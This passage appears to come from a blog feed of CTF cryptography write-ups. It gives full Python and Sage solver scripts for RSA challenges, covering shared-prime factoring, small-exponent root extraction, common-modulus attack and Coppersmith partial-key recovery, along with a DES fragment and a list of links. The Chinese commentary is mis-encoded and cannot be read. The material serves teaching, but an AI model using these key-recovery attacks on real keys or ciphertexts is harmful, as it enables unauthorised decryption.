class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line">]</span><br><span class="line">cipher_list = base64.b64encode(DES.encrypt(mes))</span><br><span class="line"><span class="built_in">print</span> cipher_list <span class="comment"># &quot;gAN5RT1XWKI0OyUayZj35SlKQ+if2PAJ&quot;</span></span><br><span class="line"><span class="comment">#flag = mes + deskey</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>å¯†ç å­¦å¤§ä½¬Blogè®°å½•</title>
    <url>/posts/aee69506/</url>
    <content><![CDATA[<p>åç»­å¤šçœ‹ä¸‹å¤§ä½¬åšå®¢ å­¦ä¹ ä¸€ä¸‹ æ…¢æ…¢è¡¥åŸºç¡€</p>
<p><a href="https://lazzzaro.github.io/">https://lazzzaro.github.io/</a></p>
<p><a href="https://jayxv.github.io/">https://jayxv.github.io/</a></p>
<p><a href="https://www.ruanx.net/author/blue/">https://www.ruanx.net/author/blue/</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Crypto 02</title>
    <url>/posts/22530663/</url>
    <content><![CDATA[<h2 id="HGAME-2022-week2-RSA-Attack2"><a href="#HGAME-2022-week2-RSA-Attack2" class="headerlink" title="[HGAME 2022 week2]RSA Attack2"></a>[HGAME 2022 week2]RSA Attack2</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">flag_parts = <span class="built_in">list</span>(<span class="built_in">map</span>(s2n, re.findall(<span class="string">rf&quot;.&#123;&#123;,<span class="subst">&#123;ceil(<span class="built_in">len</span>(flag) / <span class="number">3</span>)&#125;</span>&#125;&#125;&quot;</span>, flag)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task1&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">0</span>]</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">r = getPrime(<span class="number">1024</span>)</span><br><span class="line">n1 = p * q</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e, n1)</span><br><span class="line">n2 = r * q</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n1 =&quot;</span>, n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n2 =&quot;</span>, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task2&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">1</span>]</span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;# task3&quot;</span>)</span><br><span class="line">m = flag_parts[<span class="number">2</span>]</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, e1, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m, e2, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e1 =&quot;</span>, e1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c1 =&quot;</span>, c1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e2 =&quot;</span>, e2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c2 =&quot;</span>, c2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># task1 å…±äº«ç´ æ•°</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553</span></span><br><span class="line">c1 = <span class="number">965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479</span></span><br><span class="line">n2 = <span class="number">20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363</span></span><br><span class="line">c2 = <span class="number">11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n1 n2 å­˜åœ¨å…¬å…±å› å­q</span></span><br><span class="line">q = gmpy2.gcd(n1,n2)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="comment"># n1 = p * q</span></span><br><span class="line"><span class="comment"># n2 = r * q</span></span><br><span class="line">p = n1 // q</span><br><span class="line">r = n2 // q</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">d1 = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">d2 = gmpy2.invert(e,(r-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m1 = <span class="built_in">pow</span>(c1,d1,n1)</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,d2,n2)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;RsA@hAS!a&amp;VArIETY?of.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># task2  ä½æŒ‡æ•°e  å°æ˜æ–‡æ”»å‡»  ç›´æ¥å¼€æ ¹</span></span><br><span class="line">e2 = <span class="number">7</span></span><br><span class="line">n = <span class="number">14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537</span></span><br><span class="line">c = <span class="number">10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625</span></span><br><span class="line"></span><br><span class="line">m2 = gmpy2.iroot(c,e2)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br><span class="line"><span class="comment"># task3  å…±æ¨¡æ”»å‡»</span></span><br><span class="line">n = <span class="number">18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729</span></span><br><span class="line">e31 = <span class="number">2519901323</span></span><br><span class="line">c31 = <span class="number">3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870</span></span><br><span class="line">e32 = <span class="number">3676335737</span></span><br><span class="line">c32 = <span class="number">940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>): <span class="comment">#å…±æ¨¡æ”»å‡»å‡½æ•°</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">m3 = rsa_gong_N_def(e31,e32,c31,c32,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m3))</span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(m1)+long_to_bytes(m2)+long_to_bytes(m3)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="é¹¤åŸæ¯-2021-BabyRSA"><a href="#é¹¤åŸæ¯-2021-BabyRSA" class="headerlink" title="[é¹¤åŸæ¯ 2021]BabyRSA"></a>[é¹¤åŸæ¯ 2021]BabyRSA</h1><h3 id="é¢˜ç›®-1"><a href="#é¢˜ç›®-1" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">hint1 = p &gt;&gt; <span class="number">724</span></span><br><span class="line">hint2 = q % (<span class="number">2</span> ** <span class="number">265</span>)</span><br><span class="line">ct = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(hint1)</span><br><span class="line"><span class="built_in">print</span>(hint2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"> </span><br><span class="line"><span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line"><span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line"><span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line"><span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br></pre></td></tr></table></figure>

<h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å·²çŸ¥e n cï¼Œ</p>
<p>hint1 pçš„é«˜300ä½</p>
<p>hint2 qçš„ä½265ä½</p>
<p>å¦‚æœæƒ³ç”¨é«˜ä½æ”»å‡» é‚£ä¹ˆ1024ä½è‡³å°‘éœ€è¦å·²çŸ¥ä¸€åŠä»¥ä¸Šæ‰è¡Œã€ç½‘ä¸Šè¯´è¦570ä½ã€‘ 300+265=565ä½ è¿˜å·®5ä½</p>
<p>ç›®å‰å·²çŸ¥ 300+265ä½ã€565ä½ã€‘ è¿˜å‰©ä¸­é—´æœªçŸ¥459ä½ éœ€è¦é€šè¿‡coppersmithæ±‚è§£</p>
<p>æ­£å¸¸æƒ…å†µä¸‹éœ€è¦çŸ¥é“ 570ä½</p>
<p># q0 = q % 2**265</p>
<p># q = q0 + k*2**265</p>
<p># n = p<em>q = p</em>q0 + pk * 2**265</p>
<p># ä¸¤è¾¹åŒé™¤p</p>
<p># n * p**(-1) = q0 + pk * 2**265 * p**(-1)</p>
<p># q0 = n * p**(-1) - pk* 2**265 * p**(-1)</p>
<p># q0 = n * p**(-1) - pk*p**(-1) % 2**265</p>
<p># p qæ¢ä¸‹ä½ç½®</p>
<p># p0 = n * q**(-1) - qk*q**(-1) % 2**265</p>
<p># p0 = (n * q**(-1) ) % 2**265</p>
<h3 id="WP-1"><a href="#WP-1" class="headerlink" title="WP"></a>WP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># hint1 = p &gt;&gt; 724  pé«˜300[1024-724]ä½</span></span><br><span class="line">hint1 = <span class="number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span></span><br><span class="line">ph = hint1 &lt;&lt; <span class="number">724</span></span><br><span class="line"><span class="comment"># hint2 = q % (2 ** 265)  q ä½265ä½</span></span><br><span class="line">q0 = <span class="number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span></span><br><span class="line">n = <span class="number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span></span><br><span class="line">c = <span class="number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span></span><br><span class="line"> </span><br><span class="line">mod = <span class="built_in">pow</span>(<span class="number">2</span>,<span class="number">265</span>)</span><br><span class="line"><span class="comment"># æ ¹æ®qä½ä½ æ±‚pä½265ä½</span></span><br><span class="line"><span class="comment"># pl = (n * q**(-1) ) % 2**265</span></span><br><span class="line">pl = n*gmpy2.invert(q0,mod) % mod</span><br><span class="line"><span class="comment"># print(pl)</span></span><br><span class="line">pbar = ph+pl</span><br><span class="line"><span class="comment"># print(pbar)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#SAGE#####</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>^<span class="number">5</span>):</span><br><span class="line">    f = pbar + x*mod*<span class="number">2</span>^<span class="number">5</span></span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^<span class="number">454</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span>(roots):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    pbar += mod</span><br><span class="line">     </span><br><span class="line">p = pbar + roots[<span class="number">0</span>]*mod*<span class="number">2</span>^<span class="number">5</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">assert</span> n%p ==<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line">p = <span class="number">133637329398256221348922087205912367118213472434713498908220867690672019569057789598459580146410501473689139466275052698529257254973211963162087316149628000798221014338373126500646873612341158676084318494058522014519669302359038980726479317742766438142835169562422371156257894374341629012755597863752154328407</span></span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



